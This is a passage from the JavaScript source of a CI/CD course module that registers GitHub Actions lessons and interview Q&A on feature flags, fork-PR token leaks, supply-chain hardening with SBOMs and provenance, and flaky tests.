    '<p>Deploy puts code on servers; release makes the behaviour available to users. A flag decouples them: I merge to main daily and deploy dark with the flag off, enable it for staff, then a percentage of users, then everyone, with a kill switch to turn it off in seconds without a deploy. That lowers risk and enables trunk-based development. The costs are real: flags multiply code paths and test combinations, so each flag needs an owner and an expiry, both states are tested, and security decisions are made server side. Flags complement but do not replace canaries: a canary protects against infrastructure and performance regressions of the deployed binary.</p>',
    'I', ['How do you clean up flag debt?', 'Can a flag replace a rollback?']);
  IQ('A fork PR leaked a token from your repo. How did that likely happen and how do you fix it?',
    '<p>Most often the workflow used <code>pull_request_target</code> (which runs with secrets and a write token) and checked out and executed the PR code, for example via <code>npm install</code> scripts, or a secret was exposed to a workflow that runs fork code. First I revoke and rotate the token and review audit logs for its use. Then I change the design: use <code>pull_request</code> for untrusted code (no secrets for forks), or the two-stage pattern where an untrusted workflow uploads results and a trusted <code>workflow_run</code> workflow reads them as data. I replace long-lived tokens with OIDC, set minimal <code>permissions</code>, require approval for first-time contributors, run actionlint and zizmor in CI, and never use self-hosted runners for public fork code.</p>',
    'A', ['What other event fields are attacker controlled?', 'How would you detect that this class of bug exists across 300 repos?']);
  IQ('How do you secure a pipeline against supply-chain attacks, and what are SBOMs and provenance?',
    '<p>I reduce what the pipeline trusts. Minimal <code>permissions</code> (default read), third-party actions pinned to full SHAs with Dependabot proposing updates, an allow-list of actions at organisation level, lockfiles with <code>npm ci</code>, dependency review on PRs, secret scanning with push protection, and CODEOWNERS on workflow files. For artifacts I generate an SBOM (the ingredient list, so I can answer "are we affected?" when a CVE lands) and a signed provenance attestation (which repo, commit and workflow built this digest), using OIDC-based keyless signing. At deploy time the cluster or pipeline verifies the attestation before running the image. SLSA gives levels to describe how strong those guarantees are.</p>',
    'A', ['Why pin to a SHA if Dependabot bumps it anyway?', 'What does provenance not prove?']);
  IQ('Flaky tests are blocking merges. What do you do?',
    '<p>First measure: record which tests fail and how often, because "flaky" is data not a feeling. Then protect the team: quarantine known flaky tests into a separate non-required job that still runs and reports, while stable tests remain the gate; require a single aggregate check so branch protection stays correct. Each quarantined test gets an owner and a deadline. Fix root causes: shared state, time and ordering assumptions, fixed sleeps instead of condition waits, network and external services (use fakes). A bounded retry for known infrastructure noise is acceptable if retries are reported; blanket retries and <code>continue-on-error</code> on required jobs hide real bugs. A merge queue prevents two green PRs from breaking main together.</p>',
    'I', ['What metrics tell you the suite is healthy?', 'What would you do about a test that fails only in CI?']);

  // Replace the "@{{" and "\${" stand-ins (see the top of this file) once, for the whole module.
  function fix(v, key) {
    if (typeof v === 'string') {
      if (key === 'code') return v.replace(/\\\$\{/g, '$' + '{').replace(/@\{\{/g, '$' + '{{');
      return v.replace(/@\{\{/g, '&#36;{{');
    }
    if (Array.isArray(v)) return v.map(function (x) { return fix(x, key); });
    if (v && typeof v === 'object') { var o = {}; Object.keys(v).forEach(function (k) { o[k] = (typeof v[k] === 'function') ? v[k] : fix(v[k], k); }); return o; }
    return v;
  }

  registerModule(fix({
    id: 'devops11',
    title: 'CI/CD Pipelines',
    intro: `<p>A pipeline is the road every change travels from a developer's laptop to production. Good ones make shipping boring: small changes, tested the same way every time, deployed by a machine, and undone in minutes when something goes wrong. Bad ones are slow, flaky, over-trusted, and the reason people are afraid to deploy on Fridays.</p>
      <p>This module teaches CI/CD with <b>GitHub Actions</b> as the main tool (free for public repos, and everything runs in a throwaway repository or locally with <code>act</code>), then maps every idea to <b>GitLab CI</b> and <b>Jenkins</b>. You will write workflows with triggers, matrices, caching and artifacts, reuse them, promote one build through environments with approvals and short-lived OIDC credentials, ship with rolling, blue-green and canary strategies, roll back quickly, migrate databases safely, and lock the pipeline down against injection and supply-chain attacks. No cloud account is needed for the core labs; every secret is a placeholder.</p>`,
    goals: [
      'Write a GitHub Actions workflow with triggers, path filters, jobs, <code>needs</code>, matrices, <code>concurrency</code> and <code>workflow_dispatch</code> inputs, and compute its critical path',
      'Cut a slow pipeline with dependency caches (exact key and restore-keys), artifacts, parallel jobs, sharded tests and an aggregate required check, and handle flaky tests honestly',
      'Reuse pipeline logic with reusable workflows and composite actions, and translate a pipeline to GitLab CI and a Jenkinsfile',
      'Promote one immutable artifact through staging to production with environments, required reviewers, secrets scoped per environment and OIDC instead of long-lived cloud keys',
      'Choose and implement rolling, blue-green and canary deployments with health-based automatic rollback, use feature flags, and run database changes with expand/contract',
      'Harden a pipeline: least-privilege <code>permissions</code>, SHA-pinned actions, no script injection, safe handling of fork PRs, secret scanning, dependency review, SBOM and provenance'
    ],
    prereqs: `<p><b>Required:</b> Cloud & DevOps 4 (Git & Collaboration Workflows: branches, pull requests, tags) and Cloud & DevOps 8 (Docker: images, digests, registries, layer caching). Helpful: Cloud & DevOps 2 (Bash scripting) because most pipeline steps are shell. Bring a free GitHub account; no cloud account is required.</p>`,
    hours: 12,
    topics: topics,
    practice: practice,
    quiz: quiz,
    interview: interview
  }));
})();
